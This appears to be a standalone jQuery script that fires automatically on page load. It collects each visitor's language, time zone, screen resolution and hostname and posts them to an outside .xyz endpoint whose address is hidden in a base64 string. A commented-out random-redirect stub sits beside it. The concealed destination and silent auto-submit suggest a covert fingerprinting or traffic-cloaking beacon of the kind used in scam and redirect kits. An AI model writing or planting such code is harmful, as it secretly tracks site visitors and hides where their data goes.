$(document).ready(function () {
  $("#myForm").on("submit", function (event) {
    event.preventDefault();
    const lang = navigator.language;
    const d = new Date();
    let diff = d.getTimezoneOffset();
    let sourceUrl = window.location.hostname;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const spixel =
      window.screen.width * window.devicePixelRatio +
      "x" +
      window.screen.height * window.devicePixelRatio;
    var formValues = {
      language: lang,
      tzone: timezone,
      screenP: spixel,
      sourceFrom: sourceUrl,
    };
    var actionUrl = atob("aHR0cHM6Ly9iZXRyb3MueHl6L3Byb2Nlc3MucGhw");
    $.post(actionUrl, formValues, function (data) {
      //console.log("welcome");
    });
  });

  if ($("#myForm").submit()) {
    var delay = 85;
    var urlList = [""];
    var genRand = Math.floor(Math.random() * urlList.length) + 1;
    var randUrl = urlList[genRand - 1];
    /*setTimeout(function(){ location.replace(randUrl); }, delay);*/
  }
});
